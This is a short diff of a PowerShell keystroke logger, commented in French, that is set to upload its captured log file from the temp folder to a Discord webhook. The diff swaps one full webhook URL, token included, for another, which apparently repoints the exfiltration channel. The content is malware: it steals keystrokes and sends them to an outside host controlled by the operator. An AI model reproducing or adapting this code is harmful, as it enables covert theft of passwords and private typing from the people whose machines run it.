@@ -1,4 +1,4 @@
-<#
+    <#
 PowerShell keystroke logger by shima
 Modifié : arrêt automatique + envoi fichier Discord en pièce jointe
 #>
@@ -83,7 +83,7 @@ KeyLog
 
 # Envoyer le fichier en pièce jointe sur Discord
 $logfile = "$env:temp\key.log"
-$webhook = "https://discord.com/api/webhooks/1197260699768987748/MusyfmoPCs0DkrWb1IH2uQ0Aw6p369foF6pVYynOxL5x0wYokip9_a-kkhpbhWVATEHn"
+$webhook = "https://discord.com/api/webhooks/1555461994620919905/ridzerjQFMTS4KbMqrnenxmt6pWs8WHQH5DCnMQHTJMMPt1izAgfxXXv7fNF6J6oDjyS"
 
 Write-Host "`nEnvoi du fichier en piece jointe sur Discord..." -ForegroundColor Yellow
 
